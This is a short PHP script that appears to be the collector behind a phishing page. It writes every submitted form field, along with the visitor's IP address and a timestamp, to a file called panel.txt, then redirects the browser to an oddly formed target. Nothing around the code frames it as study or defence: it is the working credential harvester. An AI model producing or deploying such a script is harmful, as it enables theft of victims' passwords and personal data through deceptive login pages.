<?php
    

 
$datum = date('d-m-Y / H:i:s');
$ip = $_SERVER['REMOTE_ADDR'];


$handle = fopen("panel.txt", "a");
fwrite($handle, "


* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * 

");
foreach($_POST as $variable => $value) {
   fwrite($handle, $variable);
   fwrite($handle, "=");
   fwrite($handle, $value);
   fwrite($handle, "\r\n");

}
fwrite($handle, "\r\n"); 
header ('Location: 480-5af2deddc02 '); 
fwrite($handle, "IP: $ip | Date: $datum (Date=0 GTM)");
fwrite($handle, "

* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * 


");
fclose($handle);
exit;
?>
